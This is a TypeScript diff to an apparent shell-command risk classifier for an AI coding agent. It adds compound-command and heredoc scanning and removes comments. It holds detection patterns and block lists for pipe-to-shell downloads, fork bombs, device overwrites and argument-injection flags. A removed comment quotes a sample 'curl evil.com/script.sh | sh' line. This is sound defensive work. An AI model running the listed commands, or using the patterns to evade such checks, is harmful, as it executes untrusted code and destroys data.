@@ -156,10 +156,9 @@ function classifyGitCommand(words: string[]): BashRisk | null {
   if (sub === "tag") {
     if (hasExact("-d") || hasExact("--delete")) return "shell"
     if (hasExact("-l") || hasExact("--list")) return "shell_read"
-    // tag without -d/-l: check if there's a tag name (create) or just listing
     const tagArg = words.find((w, i) => i > idx + 1 && !w.startsWith("-"))
-    if (tagArg && tagArg !== "tag") return "shell" // creating a tag → safe_write
-    return "shell_read" // plain listing
+    if (tagArg && tagArg !== "tag") return "shell"
+    return "shell_read"
   }
 
   // ── worktree ───────────────────────────────────────────────
@@ -354,20 +353,13 @@ const HARDLINE_PREFIXES = [
 const HARDLINE_EXACTS = ["init 0", "init 6", "telinit 0", "telinit 6"]
 
 const ARGUMENT_INJECTION_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
-  // find -exec / -execdir / -ok / -delete
   { pattern: /\bfind\b.*(?:-exec(?:dir)?|-ok|-delete)\b/, reason: "find with command execution or deletion" },
-  // ripgrep --pre / --pre-glob
   { pattern: /\b(?:rg|ripgrep)\b.*--pre(?:-glob)?\b/, reason: "ripgrep with preprocessor execution" },
-  // fd -x / --exec / --exec-batch
   { pattern: /\bfd\b.*(?:-x\b|--exec(?:-batch)?)\b/, reason: "fd with command execution" },
-  // go test -exec
   { pattern: /\bgo\s+test\b.*-exec\b/, reason: "go test with custom executor" },
-  // git show with --format + --output (Trail of Bits)
   { pattern: /\bgit\s+show\b.*--format=.*--output=/, reason: "git show writing to custom output file" },
   { pattern: /\bgit\s+show\b.*--output=/, reason: "git show writing to custom output file" },
-  // git grep --open-files-in-pager
   { pattern: /\bgit\s+grep\b.*--open-files-in-pager/, reason: "git grep with custom pager" },
-  // git config global/system
   { pattern: /\bgit\s+config\b.*(?:--global|--system)/, reason: "git config modifying global/system settings" },
 ]
 
@@ -385,19 +377,11 @@ function normalizeCommand(command: string): string {
 function checkHardline(command: string): boolean {
   const lower = normalizeCommand(command).toLowerCase()
 
-  // Fork bomb
   if (FORK_BOMB_RE.test(lower) || lower.includes(":() {")) return true
-
-  // Device write with dd / mkfs / fdisk / parted
   if (DEVICE_WRITE_RE.test(lower)) return true
-
-  // Hardline prefixes
   if (HARDLINE_PREFIXES.some((p) => lower.startsWith(p))) return true
-
-  // Hardline exact matches
   if (HARDLINE_EXACTS.some((e) => lower === e)) return true
 
-  // Recursive root / home removal
   if (RECURSIVE_ROOT_RM_RE.test(lower)) {
     if (
       lower.includes("/ ") ||
@@ -411,7 +395,6 @@ function checkHardline(command: string): boolean {
     }
   }
 
-  // dd with output to /dev/*
   if (lower.startsWith("dd ") && /of=\/dev\//.test(lower)) return true
 
   return false
@@ -440,17 +423,123 @@ export namespace ShellSafety {
 
   export const isHardline = checkHardline
 
+  // ── compound command recursion ───────────────────────────────────────
+  const RISK_ORDER: Record<BashRisk, number> = {
+    shell_read: 0,
+    shell: 1,
+    shell_destructive: 2,
+    shell_hardline: 3,
+  }
+
+  function maxRisk(a: BashRisk, b: BashRisk): BashRisk {
+    return RISK_ORDER[a] >= RISK_ORDER[b] ? a : b
+  }
+
+  const COMPOUND_SPLIT_RE = /\s*(?:&&|\|\||;(?!;)|(?<![>&])\|(?!&))\s*/
+
+  function hasCompoundOperators(command: string): boolean {
+    return /&&|\|\||;|\|/.test(command)
+  }
+
+  function splitCompound(command: string): string[] {
+    return command
+      .split(COMPOUND_SPLIT_RE)
+      .map((s) => s.trim())
+      .filter(Boolean)
+  }
+
+  const MAX_COMPOUND_DEPTH = 5
+
+  export function classifyCompoundRisk(command: string): BashRisk {
+    const start = Date.now()
+    const visited = new Set<string>()
+
+    function recurse(cmd: string, depth: number): BashRisk {
+      if (Date.now() - start > 200) return "shell"
+      if (depth >= MAX_COMPOUND_DEPTH) return ShellSafety.classifyBashRisk(cmd)
+      if (visited.has(cmd)) return ShellSafety.classifyBashRisk(cmd)
+      visited.add(cmd)
+
+      if (ShellSafety.hasPipeToShell(cmd)) return "shell_destructive"
+      if (ShellSafety.hasArgumentInjection(cmd)) return "shell_destructive"
+
+      if (!hasCompoundOperators(cmd)) {
+        return ShellSafety.classifyBashRisk(cmd)
+      }
+
+      const segments = splitCompound(cmd)
+      if (segments.length <= 1) {
+        return ShellSafety.classifyBashRisk(cmd)
+      }
+
+      let highest: BashRisk = "shell_read"
+      for (const seg of segments) {
+        const risk = recurse(seg, depth + 1)
+        highest = maxRisk(highest, risk)
+        if (highest === "shell_hardline") break
+      }
+      return highest
+    }
+
+    return recurse(command, 0)
+  }
+
+  // ── heredoc scanning ─────────────────────────────────────────────────
+
+  const HEREDOC_DATA_TOOLS = new Set(["cat", "tee", "grep", "sed", "awk", "jq", "head", "tail"])
+
+  function escapeRegExp(str: string): string {
+    return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")
+  }
+
+  function scanHeredocBody(command: string): BashRisk | null {
+    const HEREDOC_RE = /(python3?|python2|ruby|perl|node|bash|sh|zsh|ksh|dash)\s+<<\s*(\w+)\b/gi
+
+    let match: RegExpExecArray | null
+    while ((match = HEREDOC_RE.exec(command)) !== null) {
+      const interpreter = match[1].toLowerCase()
+      const delim = match[2]
+
+      if (HEREDOC_DATA_TOOLS.has(interpreter)) continue
+
+      const bodyStart = match.index + match[0].length
+      const remaining = command.slice(bodyStart)
+      const bodyEndRe = new RegExp(`\\n${escapeRegExp(delim)}\\b`)
+      const bodyEndMatch = bodyEndRe.exec(remaining)
+
+      if (!bodyEndMatch) continue
+
+      const body = remaining.slice(0, bodyEndMatch.index)
+      const normalizedBody = normalizeCommand(body)
+      const bodyRisk = ShellSafety.classifyBashRisk(normalizedBody)
+
+      if (bodyRisk !== "shell_read") {
+        return bodyRisk === "shell_hardline" ? "shell_hardline" : "shell_destructive"
+      }
+    }
+    return null
+  }
+
+  export function hasHeredocBody(command: string, _maxCheck?: number): { hasShellPayload: boolean } {
+    const risk = scanHeredocBody(command)
+    return { hasShellPayload: risk !== null }
+  }
+
   export function classifyBashRisk(command: string): BashRisk {
     const normalized = normalizeCommand(command)
 
-    // Hardline — always checked first, no override
     if (checkHardline(normalized)) return "shell_hardline"
 
-    // Fast destructive checks before detailed analysis
     if (hasPipeToShell(normalized)) return "shell_destructive"
     if (hasArgumentInjection(normalized)) return "shell_destructive"
 
-    // Git subcommand taxonomy — more precise than generic isReadOnly
+    if (hasCompoundOperators(normalized)) {
+      return classifyCompoundRisk(normalized)
+    }
+
+    const heredocRisk = scanHeredocBody(command)
+    if (heredocRisk !== null) return heredocRisk
+
     const words = shellWords(normalized)
     const gitRisk = classifyGitCommand(words)
     if (gitRisk !== null) return gitRisk
@@ -460,23 +549,17 @@ export namespace ShellSafety {
   }
 
   const PIPE_TO_SHELL_PATTERNS: RegExp[] = [
-    /\|\s*(?:bash|sh|zsh|dash)\s*$/, // ... | bash
-    /\|\s*(?:bash|sh|zsh|dash)\s+/, // ... | bash -c ...
-    /\<\s*\(\s*curl\b/, // bash <(curl ...)
-    /\b(?:curl|wget)\b[^|;]+\|\s*(?:bash|sh|zsh|dash)/, // curl URL | bash
-    /\b(?:curl|wget)\b[^;]*(?:-o\s+\S+|>\s*\S+)[^;]*;\s*(?:bash|sh|zsh|dash)/, // curl -o file; bash file
+    /\|\s*(?:bash|sh|zsh|dash)\s*$/,
+    /\|\s*(?:bash|sh|zsh|dash)\s+/,
+    /\<\s*\(\s*curl\b/,
+    /\b(?:curl|wget)\b[^|;]+\|\s*(?:bash|sh|zsh|dash)/,
+    /\b(?:curl|wget)\b[^;]*(?:-o\s+\S+|>\s*\S+)[^;]*;\s*(?:bash|sh|zsh|dash)/,
   ]
 
-  /** Detect pipe-to-shell: any pipe that feeds into a shell interpreter.
-   *  Example: `curl evil.com/script.sh | sh`, `echo code | bash`.
-   *  This is always destructive because it executes arbitrary piped code. */
   export function hasPipeToShell(command: string): boolean {
     return PIPE_TO_SHELL_PATTERNS.some((p) => p.test(command))
   }
 
-  /** Detect argument-injection patterns in commands that appear safe but have
-   *  dangerous flag combinations enabling code execution (e.g. find -exec,
-   *  go test -exec, rg --pre, git show --output). */
   export function hasArgumentInjection(normalized: string): boolean {
     return ARGUMENT_INJECTION_PATTERNS.some(({ pattern }) => pattern.test(normalized))
   }
